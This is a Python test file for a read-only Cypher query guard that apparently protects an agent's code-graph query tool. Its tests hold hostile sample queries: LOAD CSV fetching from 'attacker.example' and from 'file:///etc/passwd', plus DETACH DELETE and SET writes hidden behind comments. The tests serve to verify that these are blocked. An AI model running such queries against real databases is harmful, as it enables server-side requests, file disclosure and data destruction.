"""The read-only guard must not rewrite the query it approves, and must
actually stop the clauses its docstring says it stops.

Two defects, one file. Both were reachable from the only ad-hoc query surface
an agent has over the code graph (``CodeIndexTools.codeindex_cypher`` →
``assert_read_only_cypher``).

1. Comments were stripped from the *returned* string before string literals
   were accounted for, so ``WHERE n.url CONTAINS 'http://x'`` had everything
   from the ``//`` onwards deleted — and the truncated query was the one that
   ran. Nothing raised; the tool answered a question nobody asked.

2. The token allowlist was evaluated and discarded (``if u not in
   _ALLOWED_TOKENS: continue``), so the only real rule was the forbidden-token
   denylist. ``LOAD CSV`` contains no forbidden token, is legal after a
   ``WITH``, and makes the Neo4j host issue an HTTP request to a URL written
   into the query.
"""

from __future__ import annotations

import pytest

from ember_code.core.graph.cypher_guard import (
    CypherGuardError,
    CypherReadOnlyViolation,
    assert_read_only_cypher,
)


class TestLiteralsSurviveIntact:
    """Before the fix each of these came back truncated at the marker."""

    def test_a_url_in_a_literal_is_not_treated_as_a_comment(self):
        query = "MATCH (n:Item) WHERE n.content CONTAINS 'http://example.com' RETURN n LIMIT 5"
        assert assert_read_only_cypher(query) == query

    def test_a_block_comment_marker_in_a_literal_survives(self):
        query = "MATCH (n:Item) WHERE n.content CONTAINS '/* generated */' RETURN n LIMIT 5"
        assert assert_read_only_cypher(query) == query

    def test_searching_for_a_line_comment_marker_survives(self):
        query = "MATCH (n:Item) WHERE n.content CONTAINS '// TODO' RETURN n LIMIT 5"
        assert assert_read_only_cypher(query) == query

    def test_a_double_quoted_literal_survives_too(self):
        query = 'MATCH (n:Item) WHERE n.path STARTS WITH "src//gen" RETURN n LIMIT 5'
        assert assert_read_only_cypher(query) == query

    def test_real_comments_are_still_removed(self):
        """The documented return contract: callers get a deterministic payload."""
        out = assert_read_only_cypher(
            "// find recent files\n/* block */\nMATCH (n:Item) RETURN n LIMIT 1"
        )
        assert "//" not in out and "/*" not in out
        assert out.startswith("MATCH")


class TestACommentCannotHideAWrite:
    """The mirror-image risk of returning the query un-stripped.

    Resolving strings first and comments second would let the apostrophe in
    ``don't`` open a literal that swallows the ``DELETE``. One left-to-right
    pass is what makes both directions impossible.
    """

    def test_an_apostrophe_in_a_comment_does_not_hide_the_next_line(self):
        with pytest.raises(CypherReadOnlyViolation):
            assert_read_only_cypher("MATCH (n) // don't\nDETACH DELETE n WHERE n.a = 'x'")

    def test_a_write_after_a_block_comment_is_still_seen(self):
        with pytest.raises(CypherReadOnlyViolation):
            assert_read_only_cypher("MATCH (n) /* it's fine */ SET n.p = 1 RETURN n")

    def test_an_unterminated_literal_is_refused_rather_than_guessed_at(self):
        with pytest.raises(CypherGuardError):
            assert_read_only_cypher("MATCH (n) WHERE n.a = 'unterminated RETURN n")


class TestServerSideFetchIsRefused:
    def test_load_csv_after_a_with_is_rejected(self):
        """Opens with MATCH, contains no forbidden token — this is the one that
        passed the guard and made the database fetch an attacker-chosen URL."""
        with pytest.raises(CypherReadOnlyViolation, match="LOAD CSV"):
            assert_read_only_cypher(
                "MATCH (i:Item) WITH i LIMIT 1 "
                "LOAD CSV FROM 'http://attacker.example/x' AS row RETURN row"
            )

    def test_load_csv_with_headers_is_rejected(self):
        with pytest.raises(CypherReadOnlyViolation, match="LOAD CSV"):
            assert_read_only_cypher(
                "MATCH (i:Item) WITH i LIMIT 1 LOAD CSV WITH HEADERS FROM "
                "'file:///etc/passwd' AS row RETURN row"
            )

    def test_load_csv_in_a_string_literal_is_still_searchable(self):
        """The phrase check reads the literal-blanked view, so looking for the
        words in stored source is not a rejection."""
        query = "MATCH (n:Item) WHERE n.content CONTAINS 'LOAD CSV FROM' RETURN n LIMIT 5"
        assert assert_read_only_cypher(query) == query


class TestTransactionClausesAreRefused:
    def test_call_in_transactions_is_rejected(self):
        with pytest.raises(CypherReadOnlyViolation, match="IN TRANSACTIONS"):
            assert_read_only_cypher(
                "MATCH (i:Item) CALL { WITH i RETURN i AS x } IN TRANSACTIONS RETURN x LIMIT 1"
            )

    def test_foreach_is_rejected(self):
        with pytest.raises(CypherReadOnlyViolation, match="FOREACH"):
            assert_read_only_cypher("MATCH (i:Item) FOREACH (x IN [1] | RETURN x) RETURN i")


class TestOrdinaryQueriesStillPass:
    """The denylist has to stay narrow enough to be usable."""

    @pytest.mark.parametrize(
        "query",
        [
            "MATCH (i:Item {project_hash: $proj}) RETURN i LIMIT 5",
            "MATCH (i:Item) RETURN i.path AS load, i.name AS csv LIMIT 5",
            "MATCH (i:Item) WHERE i.path IN ['a', 'b'] RETURN i LIMIT 5",
            "CALL db.index.vector.queryNodes('chunk_embedding', 10, $query_vector) "
            "YIELD node RETURN node LIMIT 5",
        ],
    )
    def test_it_is_allowed(self, query: str):
        assert assert_read_only_cypher(query) == query
